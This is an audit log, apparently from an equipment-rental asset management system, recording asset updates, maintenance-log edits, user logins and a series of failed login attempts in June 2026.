2026/06/02 20:20:47,bnjm2000,Updated asset X-US1215#04; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:48,bnjm2000,Updated asset X-US1215#05; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:48,bnjm2000,Updated asset X-US1215#06; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:48,bnjm2000,Updated asset X-US1215#07; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:48,bnjm2000,Updated asset X-US1215#08; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:48,bnjm2000,Updated asset X-US1215#09; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:48,bnjm2000,Updated asset X-US1215#10; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:48,bnjm2000,Updated asset X-US1215#11; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:48,bnjm2000,Updated asset X-US1215#12; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:49,bnjm2000,Updated asset X-US1215#13; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:49,bnjm2000,Updated asset X-US1215#14; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:49,bnjm2000,Updated asset X-US1215#15; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:49,bnjm2000,Updated asset X-US1215#16; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:49,bnjm2000,Updated asset X-UL8#01; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:49,bnjm2000,Updated asset X-UL8#02; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:50,bnjm2000,Updated asset X-UL8#03; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:50,bnjm2000,Updated asset X-UL8#04; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:50,bnjm2000,Updated asset X-UL8#05; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:50,bnjm2000,Updated asset X-UL8#06; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:50,bnjm2000,Updated asset X-UL8#07; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:50,bnjm2000,Updated asset X-UL8#08; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:50,bnjm2000,Updated asset X-UL8#09; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:50,bnjm2000,Updated asset X-UL8#10; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:51,bnjm2000,Updated asset X-UL8#11; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:51,bnjm2000,Updated asset X-UL8#12; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:51,bnjm2000,Updated asset X-US8#01; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:51,bnjm2000,Updated asset X-US8#02; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:51,bnjm2000,Updated asset X-US8#03; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:51,bnjm2000,Updated asset X-US8#04; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:51,bnjm2000,Updated asset X-US8#05; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:51,bnjm2000,Updated asset X-US8#06; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:52,bnjm2000,Updated asset X-US8#07; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:52,bnjm2000,Updated asset X-US8#08; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:52,bnjm2000,Updated asset X-US8#09; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:52,bnjm2000,Updated asset X-US8#10; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:52,bnjm2000,Updated asset X-US8#11; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:52,bnjm2000,Updated asset X-US8#12; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:52,bnjm2000,Updated asset X12#01; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:53,bnjm2000,Updated asset X12#02; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:53,bnjm2000,Updated asset X12#03; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:53,bnjm2000,Updated asset X12#04; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:53,bnjm2000,Updated asset X12#05; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:53,bnjm2000,Updated asset X12#06; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:53,bnjm2000,Updated asset X12#07; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:53,bnjm2000,Updated asset X12#08; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:54,bnjm2000,Updated asset X12#09; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:54,bnjm2000,Updated asset X12#10; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:54,bnjm2000,Updated asset X12#11; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:54,bnjm2000,Updated asset X12#12; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:54,bnjm2000,Updated asset X12#13; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:54,bnjm2000,Updated asset X12#14; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:54,bnjm2000,Updated asset X12#15; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:54,bnjm2000,Updated asset X12#16; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:55,bnjm2000,Updated asset X8#01; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:55,bnjm2000,Updated asset X8#02; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:55,bnjm2000,Updated asset X8#03; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:55,bnjm2000,Updated asset X8#04; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:55,bnjm2000,Updated asset X8#05; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:55,bnjm2000,Updated asset X8#06; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:55,bnjm2000,Updated asset X8#07; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:55,bnjm2000,Updated asset X8#08; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:56,bnjm2000,Updated asset X8#09; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:56,bnjm2000,Updated asset X8#10; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:56,bnjm2000,Updated asset X8#11; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:56,bnjm2000,Updated asset X8#12; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:56,bnjm2000,Updated asset X8#13; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:56,bnjm2000,Updated asset X8#14; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:56,bnjm2000,Updated asset X8#15; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:20:57,bnjm2000,Updated asset X8#16; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:21:37,bnjm2000,Updated asset SB18#01; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:21:37,bnjm2000,Updated asset SB18#02; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:21:37,bnjm2000,Updated asset SB18#03; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:21:37,bnjm2000,Updated asset SB18#04; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:21:38,bnjm2000,Updated asset SB18#05; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:21:38,bnjm2000,Updated asset SB18#06; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:21:38,bnjm2000,Updated asset SB18#07; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:21:38,bnjm2000,Updated asset SB18#08; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:21:56,bnjm2000,Updated asset SB18#09; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:21:56,bnjm2000,Updated asset SB18#10; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:21:56,bnjm2000,Updated asset SB18#11; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:21:56,bnjm2000,Updated asset SB18#12; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:22:44,bnjm2000,Updated asset MBAR#01; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:22:44,bnjm2000,Updated asset MBAR#02; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:22:44,bnjm2000,Updated asset MBAR#03; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:22:44,bnjm2000,Updated asset MBAR#04; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:23:01,bnjm2000,Updated asset MJACK#01; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:23:01,bnjm2000,Updated asset MJACK#02; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:23:15,bnjm2000,Updated asset LA4X#01; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:23:16,bnjm2000,Updated asset LA4X#02; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:23:16,bnjm2000,Updated asset LA4X#03; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:23:16,bnjm2000,Updated asset LA4X#04; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:23:16,bnjm2000,Updated asset LA4X#05; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:23:16,bnjm2000,Updated asset LA4X#06; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:23:16,bnjm2000,Updated asset LA4X#07; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:23:16,bnjm2000,Updated asset LA4X#08; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:23:17,bnjm2000,Updated asset LA4X#09; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:23:17,bnjm2000,Updated asset LA4X#10; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:26:30,bnjm2000,Updated asset AD1#01; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:26:30,bnjm2000,Updated asset AD1#02; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:26:30,bnjm2000,Updated asset AD1#03; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:26:30,bnjm2000,Updated asset AD1#04; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:26:30,bnjm2000,Updated asset AD1#05; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:26:30,bnjm2000,Updated asset AD1#06; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:26:30,bnjm2000,Updated asset AD1#07; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:26:31,bnjm2000,Updated asset AD1#08; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:26:31,bnjm2000,Updated asset AD1#09; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:26:31,bnjm2000,Updated asset AD1#10; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:26:31,bnjm2000,Updated asset AD1#11; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:26:31,bnjm2000,Updated asset AD1#12; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:26:31,bnjm2000,Updated asset AD1#13; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:26:32,bnjm2000,Updated asset AD1#14; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:26:32,bnjm2000,Updated asset AD1#15; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:26:32,bnjm2000,Updated asset AD1#16; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:26:32,bnjm2000,Updated asset AD2#01; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:26:32,bnjm2000,Updated asset AD2#02; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:26:32,bnjm2000,Updated asset AD2#03; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:26:33,bnjm2000,Updated asset AD2#04; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:26:33,bnjm2000,Updated asset AD2#05; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:26:33,bnjm2000,Updated asset AD2#06; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:26:33,bnjm2000,Updated asset AD2#07; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:26:33,bnjm2000,Updated asset AD2#08; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:26:33,bnjm2000,Updated asset AD2#09; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:26:33,bnjm2000,Updated asset AD2#10; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:26:33,bnjm2000,Updated asset AD2#11; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:26:34,bnjm2000,Updated asset AD2#12; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:26:34,bnjm2000,Updated asset AD2#13; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:26:34,bnjm2000,Updated asset AD2#14; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:26:34,bnjm2000,Updated asset AD2#15; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:26:34,bnjm2000,Updated asset AD2#16; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:26:34,bnjm2000,Updated asset AD4Q#03; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:26:34,bnjm2000,Updated asset AD4Q#04; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:27:31,bnjm2000,Updated asset ULXD1#13; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:27:31,bnjm2000,Updated asset ULXD1#14; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:27:31,bnjm2000,Updated asset ULXD1#15; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:27:32,bnjm2000,Updated asset ULXD1#16; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:27:32,bnjm2000,Updated asset ULXD1#17; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:27:32,bnjm2000,Updated asset ULXD1#18; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:27:32,bnjm2000,Updated asset ULXD2#13; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:27:32,bnjm2000,Updated asset ULXD2#14; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:27:32,bnjm2000,Updated asset ULXD2#15; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:27:32,bnjm2000,Updated asset ULXD2#16; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:27:33,bnjm2000,Updated asset ULXD2#17; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:27:33,bnjm2000,Updated asset ULXD2#18; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:27:33,bnjm2000,Updated asset ULXD4D#05; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:27:33,bnjm2000,Updated asset ULXD4D#06; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:27:33,bnjm2000,Updated asset ULXD4Q#02; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:27:33,bnjm2000,Updated asset ULXD4Q#03; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:27:51,bnjm2000,Updated asset SBC800#01; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:28:06,bnjm2000,Updated asset CT3#01; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:28:32,bnjm2000,Updated asset LAP1#01; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:30:06,bnjm2000,Updated asset QM75C#01; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:30:06,bnjm2000,Updated asset QM75C#02; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:30:07,bnjm2000,Updated asset QM75C#03; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:30:07,bnjm2000,Updated asset QM75C#04; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:30:07,bnjm2000,Updated asset QM85C#01; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:30:07,bnjm2000,Updated asset QM85C#02; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:30:07,bnjm2000,Updated asset QM85C#03; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:30:07,bnjm2000,Updated asset QM85C#04; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:40:53,bnjm2000,Updated asset 63ADB#03; applyTo=single; updatedAssets=1; eventsUpdated=1; containersUpdated=0
2026/06/02 20:41:41,bnjm2000,Updated asset 6061#13; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:41:41,bnjm2000,Updated asset 6061#13; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:41:42,bnjm2000,Updated asset 6061#14; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:41:42,bnjm2000,Updated asset 6061#14; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:41:42,bnjm2000,Updated asset 6061#15; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:41:42,bnjm2000,Updated asset 6061#15; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:41:42,bnjm2000,Updated asset 6061#16; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:41:42,bnjm2000,Updated asset 6061#16; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:42:48,bnjm2000,Updated asset HERCULES 8#01; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 20:42:48,bnjm2000,Updated asset HERCULES 8#02; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/03 00:03:39,bnjm2000,Added assets MEGARA300#01 to MEGARA300#04 via web interface
2026/06/03 00:12:34,bnjm2000,Updated asset SM57#02; applyTo=allSimilar; updatedAssets=10; eventsUpdated=7; containersUpdated=0
2026/06/03 00:15:13,bnjm2000,Updated asset J48M#01; applyTo=allSimilar; updatedAssets=10; eventsUpdated=11; containersUpdated=0
2026/06/03 00:15:24,bnjm2000,Updated asset J48S#01; applyTo=allSimilar; updatedAssets=6; eventsUpdated=10; containersUpdated=0
2026/06/03 00:15:39,bnjm2000,Updated asset JDIM#01; applyTo=allSimilar; updatedAssets=4; eventsUpdated=1; containersUpdated=0
2026/06/03 00:15:50,bnjm2000,Updated asset JDIS#01; applyTo=allSimilar; updatedAssets=4; eventsUpdated=6; containersUpdated=0
2026/06/03 00:16:32,bnjm2000,Added assets SRM150#01 to SRM150#02 via web interface
2026/06/03 00:17:06,bnjm2000,Added assets 181024G#01 to 181024G#02 via web interface
2026/06/03 00:28:20,bnjm2000,Updated asset AURORA#03; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/03 00:31:33,bnjm2000,Updated maintenance log for asset CLICKER#02: 'Replaced battery.' -> 'Replaced battery.' (edited by bnjm2000)
2026/06/03 00:33:56,bnjm2000,"Updated maintenance log for asset DIABLO#23: 'Discovered screw thread rounded when doing cleaning
-Jacky' -> 'Discovered screw thread rounded when doing cleaning' (edited by bnjm2000)"
2026/06/03 00:34:33,bnjm2000,"Updated maintenance log for asset DM3#01: 'Replaced PCB (report no. PA842034) $586.84 (FOC, under warraty)' -> 'Replaced PCB (report no. PA842034) $586.84 (FOC, under warranty)' (also: Location: Yamaha Service Center, Cleared OOC) (edited by bnjm2000)"
2026/06/03 00:35:30,bnjm2000,Updated asset DZ13K#01; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/03 00:44:22,bnjm2000,Updated asset COMBINE4#01; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/03 00:49:07,bnjm2000,Updated asset MR-90A#01; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/03 00:49:08,bnjm2000,Updated asset MR-90A#02; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/03 00:49:08,bnjm2000,Updated asset MT-90A#01; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/03 00:49:08,bnjm2000,Updated asset MT-90A#02; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/03 00:50:19,bnjm2000,Updated asset MR-90A#03; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/03 00:50:19,bnjm2000,Updated asset MR-90A#04; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/03 00:50:20,bnjm2000,Updated asset MR-90A#05; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/03 00:50:20,bnjm2000,Updated asset MR-90A#06; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/03 00:50:20,bnjm2000,Updated asset MT-90A#03; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/03 00:50:21,bnjm2000,Updated asset MT-90A#04; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/03 00:56:11,bnjm2000,Updated user admin
2026/06/03 16:36:40,bnjm2000,User bnjm2000 logged in via web interface
2026/06/03 16:39:17,bnjm2000,Set asset MEGARA300#02 status to OOC
2026/06/03 16:39:17,bnjm2000,Maintenance logged for asset MEGARA300#02: Handle broken (Dry hire: Avery Events)
2026/06/04 13:01:49,bnjm2000,User bnjm2000 logged in via web interface
2026/06/06 11:46:17,tjacky,User tjacky logged in via web interface
2026/06/06 11:55:28,system,Failed login attempt for username: rrafie
2026/06/06 11:55:44,system,Failed login attempt for username: rrafie
2026/06/06 11:55:47,rrafie,User rrafie logged in via web interface
2026/06/19 16:16:13,tjacky,User tjacky logged in via web interface
2026/06/19 16:25:00,cterence,User cterence logged in via web interface
2026/06/22 10:23:59,cterence,User cterence logged in via web interface
2026/06/22 10:46:25,cterence,User cterence logged in via web interface
2026/06/22 12:31:22,bnjm2000,User bnjm2000 logged in via web interface
2026/06/22 13:39:35,bnjm2000,Updated asset BULK-0025; applyTo=single; updatedAssets=1; eventsUpdated=2; containersUpdated=0
2026/06/22 13:39:40,bnjm2000,Updated asset BULK-0026; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/22 14:03:49,tjacky,User tjacky logged in via web interface
2026/06/22 16:27:44,system,Failed login attempt for username: jamie
2026/06/22 16:27:48,system,Failed login attempt for username: jamie
2026/06/22 16:27:52,system,Failed login attempt for username: jamie
2026/06/22 16:27:56,system,Failed login attempt for username: jamie
2026/06/22 16:27:59,system,Failed login attempt for username: jamiec
2026/06/22 16:28:02,system,Failed login attempt for username: jamiec
2026/06/22 16:28:06,system,Failed login attempt for username: jamiec
2026/06/22 16:28:11,system,Failed login attempt for username: jamiec
2026/06/22 16:28:15,system,Failed login attempt for username: jamiec
2026/06/22 16:28:28,system,Failed login attempt for username: jamiec
2026/06/22 16:28:32,system,Failed login attempt for username: jamiec
2026/06/22 16:28:36,system,Failed login attempt for username: jamie
2026/06/22 16:28:47,system,Failed login attempt for username: jamie
